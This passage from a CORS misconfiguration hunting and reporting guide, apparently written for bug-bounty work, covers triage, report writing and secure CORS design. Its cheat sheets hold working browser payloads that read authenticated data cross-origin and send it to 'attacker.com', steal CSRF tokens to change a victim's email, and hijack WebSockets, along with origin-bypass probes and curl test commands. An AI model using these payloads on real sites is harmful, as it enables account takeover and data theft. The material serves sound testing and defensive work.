2. **Baseline**: send `Origin: evil.com`; read ACAO/ACAC; confirm the body holds a secret.
3. **Map ACAO logic** & **bypass** to get your origin (or `null`) reflected + `ACAC:true`.
4. **Preflight** (if needed): test for custom-header reads / writes / exposed response headers.
5. **Exploit**: browser `fetch()` reads a second account's secret → ATO/CSRF-chain/write; check cache-poisoning & CSWSH.
6. **Chain** the secret to RCE/cloud where applicable.
7. **Report**: own-account browser proof, redacted, impact-led, deduped per policy.

### Q87. Quick triage decision tree.
- ACAO reflects evil.com + `ACAC:true` + secret body → credentialed theft → token? → **ATO (Critical)**.
- `ACAO: null` + `ACAC:true` + secret → sandboxed-iframe exploit → as above (High).
- Allowlist you can't satisfy from evil.com (`*.target.com`) → subdomain takeover/XSS → then theft.
- WS endpoint cookie-authed, handshake ignores Origin → **CSWSH**.
- Reflected ACAO cacheable + no `Vary: Origin` → **cache poisoning**.
- `ACAO: *` + no creds → sensitive no-auth data? else **Info**.
- Reflection without creds/secret, or `*`+`ACAC`, or static ACAO → **not exploitable / Info**.

### Q88. False positives / auto-reject.
- `ACAO: *` on public/non-sensitive data, no creds → Info.
- Reflected origin without `ACAC:true` and no sensitive/auth-less body → Low/Info.
- `ACAO:*` **and** `ACAC:true` together → browser ignores for creds → not exploitable.
- Static/correct ACAO (the real frontend) you don't control.
- "Vulnerable" proven only by curl with no browser read and no credentials.

### Q89. What makes a great CORS report?
Title names the **impact** (e.g., "CORS misconfiguration (origin reflection + credentials) on /api/me → cross-origin account takeover"), CVSS + CWE-942/346, the exact endpoint + technique (reflect/null/bypass) + whether `ACAC:true`, the vulnerable response headers, the **browser `fetch()` PoC** reading a second test account's secret (redacted), the realized impact (ATO/data-breach/CSRF/RCE chain), and remediation. One finding per policy/root cause.

---

# CHEAT SHEETS

### Q90. Origin-probe cheat sheet.
```
reflect-any:  https://evil.com  https://a1b2c3-random.example  https://attacker.test
null:         null   (sandboxed iframe / data: / redirect)
suffix:       https://nottarget.com   https://eviltarget.com   https://target.com.evil.com
prefix:       https://target.com.evil.com   https://target.com.evil.com:1337
contains:     https://target.com.evil.com   https://evil.com/?target.com   https://target-com.evil.com
regex dot:    https://targetXcom   https://targetacom.evil.com
subdomain:    https://sub.target.com   (need takeover/XSS to control it)
parser:       https://target.com%60.evil.com  https://target.com&.evil.com  https://target.com,evil.com
scheme/port:  http://target.com   https://target.com.   https://TARGET.com   https://target.com:443
```

### Q91. Header-reading cheat sheet.
```
ACAO reflects evil.com + ACAC:true + secret body         → REPORT (High; Critical if token→ATO or secret→RCE)
ACAO: null + ACAC:true + secret body                     → REPORT (High)
ACAO reflects evil.com + NO ACAC                          → only if body sensitive & auth-less → else Info
ACAO: * + NO ACAC                                         → only if sensitive no-auth data → else Info
ACAO: * + ACAC:true                                       → NOT exploitable (browser ignores for creds)
ACAO static/correct                                       → not a bug unless you control that origin
proven only with curl (no browser read / no creds)        → NOT proven — build the fetch() PoC
```

### Q92. Exploitation PoC cheat sheet.
```html
<!-- credentialed read (reflect-any / bypass origin) -->
<script>fetch('https://api.target/me',{credentials:'include'}).then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/x',d))</script>
<!-- null origin (sandboxed iframe) -->
<iframe sandbox=allow-scripts srcdoc="<script>fetch('https://api.target/me',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))<\/script>"></iframe>
<!-- CSRF-token theft → state change -->
<script>fetch('/api/csrf',{credentials:'include'}).then(r=>r.json()).then(t=>fetch('/api/email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-CSRF-Token':t.token},body:'{"email":"a@evil.tld"}'}))</script>
<!-- CSWSH -->
<script>const ws=new WebSocket('wss://target/chat');ws.onopen=()=>ws.send('{"action":"getMessages"}');ws.onmessage=e=>navigator.sendBeacon('https://attacker.com/x',e.data)</script>
```

### Q93. Preflight / write cheat sheet.
```bash
curl -s -D - -o /dev/null -X OPTIONS https://api.target/account \
  -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,content-type" | grep -i 'access-control'
# permissive => ACAO reflected + ACAC:true + ACAM has PUT/DELETE + ACAH has your headers (+ Expose-Headers for header-secrets)
```

### Q94. Cache-poisoning probe cheat sheet.
```bash
curl -s -D - -o /dev/null -H "Origin: https://evil.com" https://target/api/config | grep -iE 'access-control-allow-origin|age|x-cache|vary'
curl -s -D - -o /dev/null https://target/api/config | grep -i 'access-control-allow-origin'   # served reflected ACAO from cache? = poisoned (no Vary: Origin)
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q95. Recurring real-world CORS wins.
- **Reflect-any + `ACAC:true`** on `/api/me`/`/account`/`/graphql` → read session token/API key → **ATO** (countless disclosures).
- **`Origin: null` trusted** with credentials (devs think `null` is safe) → sandboxed-iframe theft.
- **Weak allowlist** (`endsWith`/`contains`/unanchored regex) → register a matching attacker origin.
- **`*.target.com` trust + subdomain takeover/XSS** → host exfil on a trusted sub.
- **CORS-readable CSRF token** on an otherwise CSRF-safe app → email/password change → ATO.
- **CORS leaking cloud/admin/CI secret** → cloud/RCE chain.
- **CSWSH** on chat/notification/admin WebSockets → authenticated read+write.
- **Reflected ACAO cached without `Vary: Origin`** → mass theft / DoS.

### Q96. Notable references to work through.
PortSwigger Web Security Academy → **CORS** labs (basic origin reflection, trusted-null, trusted-subdomain) + the **Cross-site WebSocket hijacking** topic; OWASP CORS guidance + WSTG; HackTricks *CORS bypass*; PayloadsAllTheThings *CORS Misconfiguration*; MDN CORS docs; Corsy / CORScanner. Read disclosed HackerOne/Bugcrowd "CORS misconfiguration → account takeover / sensitive data" reports.

### Q97. CWE / standards to cite.
**CWE-942** (Permissive Cross-domain Policy), **CWE-346** (Origin Validation Error), plus outcome CWEs (CWE-200, CWE-384, CWE-352). CVSS reflects scope-change (S:C) when an attacker origin reads another origin's authenticated data.

---

# DEFENSE — SECURE CORS

### Q98. What's the secure CORS design?
Use a **strict allowlist of exact origins** (scheme + host + port) — never reflect arbitrary `Origin`. Never return `Access-Control-Allow-Credentials: true` for `null` or for a wildcard. Don't combine `*` with credentials. Anchor and escape any origin regex (`^https://app\.target\.com$`), never `contains`/`startsWith`/`endsWith`. Scope `ACAC:true` to the few endpoints that truly need it.

### Q99. Per-risk hardening?
- **Reflection:** exact-match allowlist; if origin not allowed, omit ACAO entirely.
- **`null`:** never allow it (especially with credentials).
- **Secrets:** serve secret-bearing responses on **non-CORS** paths, or require a non-cookie auth + per-request token.
- **Cache:** add `Vary: Origin` (or strip the reflected ACAO from cacheable responses) to prevent cache poisoning.
- **WebSockets (CSWSH):** validate the `Origin` header on the handshake + use a per-connection CSRF token.
- **Preflight:** don't return permissive `ACAM`/`ACAH`/`Expose-Headers` broadly; scope to need.

### Q100. One-paragraph summary you can quote.
*"CORS is the server's decision about which other origins may read its responses — so the only safe configuration is an exact-match allowlist of trusted origins, never a reflection of the client-supplied `Origin`, and never `null` or `*` together with `Access-Control-Allow-Credentials: true`. The high-impact bug is an attacker-controlled origin reflected with credentials on an endpoint that returns a secret: it lets any web page silently read a logged-in victim's session token, API key, PII, or CSRF token and take over their account — no XSS required. Anchor and escape origin regexes, add `Vary: Origin` to cacheable CORS responses, validate `Origin` on WebSocket handshakes (CSWSH), and keep secrets off CORS-enabled paths — a single reflected header with credentials can defeat the browser's same-origin protection for every one of your users."*

---

## APPENDIX — 60-second CORS field checklist
```
[ ] Find endpoints returning Access-Control-Allow-* — esp. AUTHENTICATED, SECRET-bearing (/api/me, /keys, /graphql)
[ ] Baseline: Origin: https://evil.com → ACAO reflects it? ACAC:true? body has a secret? (log in as test acct A)
[ ] Map ACAO logic; bypass: reflect-any / null (sandboxed iframe) / endsWith-startsWith-contains-regex / *.target.com→takeover
[ ] Preflight (if needed): OPTIONS + ACRM/ACRH → custom-header reads / JSON-PUT writes / Expose-Headers secrets
[ ] Exploit (browser, OWN accounts): exfil.html reads account A's secret cross-origin → token? → REPLAY → ATO
[ ] CSRF-token CORS-readable? → steal → email/pw change → ATO
[ ] Cross-origin WRITE (permissive preflight)? · CSWSH (WS handshake ignores Origin)? · cache poison (no Vary: Origin)?
[ ] Leaked cloud/admin/CI secret? → CORS → RCE/shell chain (own tenant, read-only)
[ ] FP check: kill bare * / reflection-without-creds / *+ACAC / static ACAO ; prove in a REAL browser, not curl
[ ] Report IMPACT (ATO/data theft/RCE), CWE-942/346, redact secret, take PoC page down, dedup per policy
```
*End of guide.*
